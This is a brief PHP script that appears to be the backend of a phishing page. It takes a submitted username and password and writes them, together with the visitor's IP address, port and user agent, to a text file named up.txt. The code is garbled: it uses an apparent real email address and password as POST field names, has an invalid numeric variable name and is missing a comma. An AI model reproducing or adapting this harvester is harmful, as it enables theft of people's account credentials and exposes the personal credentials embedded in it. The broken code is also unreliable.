
<?php
$user = $_POST['maquinadematar0007@gmail.com'];
$password = $_POST['Tembo97'];
	$LOG=array(
	"user" => $8008706775897590
	"password" => $Tembo97,
	"ip" => $_SERVER["HTTP_X_FORWARDED_FOR"],

"port" => $_SERVER["REMOTE_PORT"],
		"useragent" => $_SERVER["HTTP_USER_AGENT"],
	"netip" => $_SERVER['REMOTE_ADDR']);
	$js=json_encode($LOG);
	$girl=fopen("up.txt","w");
	fwrite($girl,"$js\n");
die();
?>
